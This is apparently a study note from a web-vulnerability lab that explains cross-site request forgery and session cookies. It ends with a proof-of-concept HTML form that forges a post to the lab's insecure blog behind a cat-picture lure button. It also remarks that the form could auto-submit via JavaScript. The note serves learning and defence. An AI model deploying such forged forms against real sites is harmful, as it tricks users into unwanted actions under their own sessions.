---
title: CSRF
date: 2026-05-10
tags:
  - Web-Vulnerability
  - unit363-web-vuln-lab
  - OWASP-Top10
---

# What is CSRF
Cross-**site** request forgery (CSRF or XSRF) is a web vulnerability where an attacker can perform actions on behalf of a victim. This is possible because the browser automatically attaches the session cookie to cross-site requests. (Also called one-click attack or session riding.)

# How does CSRF Work
In this chapter we want to explore this vulnerability in depth. 
For that we have to first understand how session-based authentication works in a web application.

## Session-based Authentication (Cookies)
When a user logs in, the server needs a way to recognize them on subsequent requests - HTTP is stateless, so it can't remember who you are by itself.
1. User POSTs credentials → server validates
2. Server creates a **session** (stored server-side: DB, Redis, etc.)
3. Server sends a `Set-Cookie: session_id=abc123` header
4.  Browser automatically attaches `Cookie: session_id=abc123` to **every** subsequent request to that domain
5. Server looks up the session ID and knows who you are

>There are other authentication mechanisms (e.g. token-based). I won't cover them here - but note that token-based auth is only **not** vulnerable to CSRF when the token is sent via the `Authorization` header, not when it's stored in a cookie.


## The Attack 
Because the browser automatically attaches the session cookie to each request to [insecure-blog.unit363.lab](insecure-blog.unit363.lab) an attacker can create an evil page. If the victim visits this page the request gets auto-submitted from a hidden form. (In my case, I put button there for more controlled output, but you can easily auto submit via JavaScript)

```` html
 
<form method="POST" action="http://insecure-blog.unit363.lab:36301/post" target="hidden-frame">
	<input type="hidden" name="title" value="CSRF Attack!">
	<input type="hidden" name="content" value="This was posted by the Evil Page">
	<img src="/static/images/cat.jpg" alt="Cat" class="img-fluid w-50">
	<button type="submit" class="btn btn-primary">Click if you Like Cats</button>
</form> 
````

